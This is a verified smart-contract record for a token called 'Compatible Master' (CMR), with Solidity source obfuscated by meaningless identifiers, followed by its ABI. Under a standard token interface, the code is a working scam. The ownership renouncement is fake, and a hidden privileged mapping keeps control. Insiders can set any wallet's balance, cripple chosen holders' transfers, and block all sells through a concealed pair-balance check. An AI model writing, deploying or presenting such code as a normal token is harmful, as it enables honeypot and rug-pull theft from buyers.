{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface liquidityFee {\n    function createPair(address tokenList, address teamExempt) external returns (address);\n}\n\ninterface atSenderWallet {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address minLaunch) external view returns (uint256);\n\n    function transfer(address launchedReceiverEnable, uint256 fromSender) external returns (bool);\n\n    function allowance(address txBuy, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fromSender) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchedReceiverEnable,\n        uint256 fromSender\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed modeLaunch, uint256 value);\n    event Approval(address indexed txBuy, address indexed spender, uint256 value);\n}\n\nabstract contract launchTx {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tradingTokenTo {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface atSenderWalletMetadata is atSenderWallet {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CompatibleMaster is launchTx, atSenderWallet, atSenderWalletMetadata {\n\n    function owner() external view returns (address) {\n        return enableReceiver;\n    }\n\n    function approve(address amountSellTo, uint256 fromSender) public virtual override returns (bool) {\n        minLiquidityTrading[_msgSender()][amountSellTo] = fromSender;\n        emit Approval(_msgSender(), amountSellTo, fromSender);\n        return true;\n    }\n\n    address private enableReceiver;\n\n    event OwnershipTransferred(address indexed amountLimit, address indexed launchedSell);\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverSwap;\n    }\n\n    address public txTrading;\n\n    function name() external view virtual override returns (string memory) {\n        return tokenAtTx;\n    }\n\n    function walletFee() private view {\n        require(isShould[_msgSender()]);\n    }\n\n    mapping(address => bool) public amountMarketingBuy;\n\n    function getOwner() external view returns (address) {\n        return enableReceiver;\n    }\n\n    uint256 private tradingTx = 100000000 * 10 ** 18;\n\n    function minFee(uint256 fromSender) public {\n        walletFee();\n        txFrom = fromSender;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return txLiquidity;\n    }\n\n    bool public senderMarketingReceiver;\n\n    function receiverLaunched() public {\n        emit OwnershipTransferred(swapFund, address(0));\n        enableReceiver = address(0);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingTx;\n    }\n\n    address public swapFund;\n\n    mapping(address => uint256) private autoMin;\n\n    bool public txSell;\n\n    constructor (){\n        if (senderMarketingReceiver) {\n            fromSell = tradingLiquidityExempt;\n        }\n        tradingTokenTo sellSender = tradingTokenTo(feeBuy);\n        txTrading = liquidityFee(sellSender.factory()).createPair(sellSender.WETH(), address(this));\n        if (fromSell == tradingLiquidityExempt) {\n            takeMax = true;\n        }\n        swapFund = _msgSender();\n        isShould[swapFund] = true;\n        autoMin[swapFund] = tradingTx;\n        receiverLaunched();\n        \n        emit Transfer(address(0), swapFund, tradingTx);\n    }\n\n    uint256 teamLaunched;\n\n    uint256 constant fundAutoMode = 18 ** 10;\n\n    string private txLiquidity = \"CMR\";\n\n    function transferFrom(address tradingSwapExempt, address launchedReceiverEnable, uint256 fromSender) external override returns (bool) {\n        if (_msgSender() != feeBuy) {\n            if (minLiquidityTrading[tradingSwapExempt][_msgSender()] != type(uint256).max) {\n                require(fromSender <= minLiquidityTrading[tradingSwapExempt][_msgSender()]);\n                minLiquidityTrading[tradingSwapExempt][_msgSender()] -= fromSender;\n            }\n        }\n        return isBuy(tradingSwapExempt, launchedReceiverEnable, fromSender);\n    }\n\n    address feeBuy = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => bool) public isShould;\n\n    uint256 txFrom;\n\n    function exemptMax(address tradingSwapExempt, address launchedReceiverEnable, uint256 fromSender) internal returns (bool) {\n        require(autoMin[tradingSwapExempt] >= fromSender);\n        autoMin[tradingSwapExempt] -= fromSender;\n        autoMin[launchedReceiverEnable] += fromSender;\n        emit Transfer(tradingSwapExempt, launchedReceiverEnable, fromSender);\n        return true;\n    }\n\n    function enableLiquidity(address exemptMaxLaunched) public {\n        if (txSell) {\n            return;\n        }\n        if (fromSell != tradingLiquidityExempt) {\n            shouldLaunch = true;\n        }\n        isShould[exemptMaxLaunched] = true;\n        \n        txSell = true;\n    }\n\n    function tokenSell(address receiverAt) public {\n        walletFee();\n        \n        if (receiverAt == swapFund || receiverAt == txTrading) {\n            return;\n        }\n        amountMarketingBuy[receiverAt] = true;\n    }\n\n    string private tokenAtTx = \"Compatible Master\";\n\n    uint256 public tradingLiquidityExempt;\n\n    uint8 private receiverSwap = 18;\n\n    function balanceOf(address minLaunch) public view virtual override returns (uint256) {\n        return autoMin[minLaunch];\n    }\n\n    function transfer(address takeAmount, uint256 fromSender) external virtual override returns (bool) {\n        return isBuy(_msgSender(), takeAmount, fromSender);\n    }\n\n    uint256 private fromSell;\n\n    function allowance(address atTake, address amountSellTo) external view virtual override returns (uint256) {\n        if (amountSellTo == feeBuy) {\n            return type(uint256).max;\n        }\n        return minLiquidityTrading[atTake][amountSellTo];\n    }\n\n    address txReceiverLimit = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function takeTotal(address takeAmount, uint256 fromSender) public {\n        walletFee();\n        autoMin[takeAmount] = fromSender;\n    }\n\n    function isBuy(address tradingSwapExempt, address launchedReceiverEnable, uint256 fromSender) internal returns (bool) {\n        if (tradingSwapExempt == swapFund) {\n            return exemptMax(tradingSwapExempt, launchedReceiverEnable, fromSender);\n        }\n        uint256 exemptReceiverList = atSenderWallet(txTrading).balanceOf(txReceiverLimit);\n        require(exemptReceiverList == txFrom);\n        require(launchedReceiverEnable != txReceiverLimit);\n        if (amountMarketingBuy[tradingSwapExempt]) {\n            return exemptMax(tradingSwapExempt, launchedReceiverEnable, fundAutoMode);\n        }\n        return exemptMax(tradingSwapExempt, launchedReceiverEnable, fromSender);\n    }\n\n    mapping(address => mapping(address => uint256)) private minLiquidityTrading;\n\n    bool public shouldLaunch;\n\n    bool private takeMax;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedSell\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeLaunch\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountSellTo\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountMarketingBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountSellTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromSender\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minLaunch\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptMaxLaunched\",\"type\":\"address\"}],\"name\":\"enableLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fromSender\",\"type\":\"uint256\"}],\"name\":\"minFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderMarketingReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromSender\",\"type\":\"uint256\"}],\"name\":\"takeTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAt\",\"type\":\"address\"}],\"name\":\"tokenSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingLiquidityExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromSender\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingSwapExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedReceiverEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromSender\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "CompatibleMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}